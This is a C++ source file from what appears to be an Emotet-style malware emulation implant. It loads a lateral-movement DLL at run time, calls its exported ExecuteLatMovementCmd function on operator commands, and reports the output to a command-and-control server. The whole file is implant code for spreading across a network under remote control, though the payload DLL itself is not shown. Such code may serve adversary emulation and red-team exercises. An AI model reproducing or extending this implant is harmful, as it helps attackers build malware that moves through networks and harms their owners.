#include "pch.h"
#include "latmove.h"

using namespace std;

//Global variables
ExecuteLatMovementCmdPtr executeLatMovementCmdFunc = NULL;

/*
 * loadLatMovementModule:
 *      About:
 *          Loads module from file, creates pointers to the exported functions
 *			from the DLL
 *      Result:
 *          If the function fails, returns failure to C2
 *
 */
bool loadLatMovementModule(EmotetComms* comms, string modulePath) {
	// Load Lateral Movement DLL
	HMODULE hLatMovementDLL = LoadLibraryA(modulePath.c_str());

	if (!hLatMovementDLL) {
		printf("Could not load Lat Movement DLL\n");
		comms->sendOutput("Could not load Lat Movement DLL");
		return false;
	}

	executeLatMovementCmdFunc = (ExecuteLatMovementCmdPtr)::GetProcAddress(hLatMovementDLL, "ExecuteLatMovementCmd");
	if (!executeLatMovementCmdFunc) {
		printf("Could not load function\n");
		comms->sendOutput("Could not load function");
		return false;
	}

	return comms->sendOutput("successfully loaded lateral movement module");
}

// wrapper of exported function to include C2 comms
bool executeLatMovementCmd(EmotetComms* comms, string cmd) {
	if (executeLatMovementCmdFunc)
		return comms->sendOutput(executeLatMovementCmdFunc(cmd));
	else
		return comms->sendOutput("function is not loaded");
}